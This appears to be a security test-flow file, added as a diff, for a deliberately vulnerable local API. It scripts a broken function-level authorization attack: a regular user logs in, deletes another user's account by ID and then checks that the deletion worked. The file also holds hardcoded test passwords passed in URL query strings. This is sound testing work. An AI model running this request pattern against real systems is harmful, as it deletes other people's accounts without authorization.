@@ -1,0 +1,55 @@
+{
+    "id": "flow_bfla_gracewilson_deletes_other_user",
+    "name": "BFLA: GraceWilson (Regular User) Deletes Another User",
+    "description": "GraceWilson, a non-admin user, exploits BFLA to delete another non-admin user (FrankMiller).",
+    "staticVars": {
+      "baseUrl": "http://localhost:8000",
+      "graceUsername": "GraceWilson",
+      "gracePassword": "GracePass7&",
+      "victimUserToDeleteId": "00000007-0000-0000-0000-000000000007",
+      "victimUserToDeleteUsername": "FrankMiller"
+    },
+    "steps": [
+      {
+        "id": "step_login_gracewilson_bfla_delete_user",
+        "name": "Login GraceWilson",
+        "type": "request",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/auth/login?username={{graceUsername}}&password={{gracePassword}}",
+        "onFailure": "stop",
+        "extract": {
+          "grace_token": "body.access_token"
+        }
+      },
+      {
+        "id": "step_gracewilson_delete_frankmiller_bfla",
+        "name": "GraceWilson Deletes FrankMiller (BFLA)",
+        "type": "request",
+        "method": "DELETE",
+        "url": "{{baseUrl}}/api/users/{{victimUserToDeleteId}}",
+        "headers": {
+          "Authorization": "Bearer {{grace_token}}"
+        },
+        "onFailure": "stop"
+      },
+      {
+        "id": "step_gracewilson_verify_frankmiller_deleted_by_get",
+        "name": "Verify FrankMiller Deletion (Attempt GET)",
+        "type": "request",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/users/{{victimUserToDeleteId}}",
+        "headers": {
+          "Authorization": "Bearer {{grace_token}}"
+        },
+        "onFailure": "continue"
+      },
+      {
+        "id": "step_gracewilson_verify_frankmiller_deleted_by_login_fail",
+        "name": "Verify FrankMiller Deletion (Attempt Login)",
+        "type": "request",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/auth/login?username={{victimUserToDeleteUsername}}&password=FrankPass6^",
+        "onFailure": "continue"
+      }
+    ]
+  }
